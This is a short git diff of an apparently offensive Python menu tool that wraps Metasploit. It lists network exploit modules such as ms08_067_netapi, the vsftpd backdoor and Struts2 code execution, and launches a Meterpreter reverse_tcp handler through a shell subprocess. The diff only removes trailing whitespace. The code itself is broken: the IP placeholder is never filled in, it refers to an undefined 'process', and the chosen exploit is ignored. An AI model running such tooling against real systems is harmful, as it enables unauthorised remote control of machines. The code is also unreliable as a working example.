@@ -506,21 +506,21 @@ def metasploit_scan():
            elif choice == '5':
               print(Fore.BLUE + "\nViewing all network exploits...")
               exploits = {
-               "11": "exploit/multi/http/tomcat_mgr_upload",  
-                "22": "exploit/windows/dcerpc/ms03_026_dcom",  
-                "33": "exploit/windows/smb/ms08_067_netapi",  
-                "44": "exploit/unix/ftp/vsftpd_234_backdoor",  
-                "55": "exploit/multi/http/struts2_code_exec",  
-                "66": "exploit/multi/http/jboss_deployment_scanner"  
-      
-              }  
-              
+               "11": "exploit/multi/http/tomcat_mgr_upload",
+                "22": "exploit/windows/dcerpc/ms03_026_dcom",
+                "33": "exploit/windows/smb/ms08_067_netapi",
+                "44": "exploit/unix/ftp/vsftpd_234_backdoor",
+                "55": "exploit/multi/http/struts2_code_exec",
+                "66": "exploit/multi/http/jboss_deployment_scanner"
+
+              }
+
               for key, value in exploits.items():
                 print(f"{key}: {value}")
               exploit_choice = input(Fore.BLUE + "\nEnter the number of the exploit you want to run: ").strip()
               if exploit_choice in exploits:
-                metasploit_command = "msfconsole -q -x \"use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost {ip}; set lport 4444; exploit -j\""  
-                subprocess.Popen(metasploit_command, shell=True) 
+                metasploit_command = "msfconsole -q -x \"use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost {ip}; set lport 4444; exploit -j\""
+                subprocess.Popen(metasploit_command, shell=True)
                 stdout, stderr = process.communicate()
                 if stderr:
                    print(Fore.RED + "Error during Metasploit:", stderr.decode())
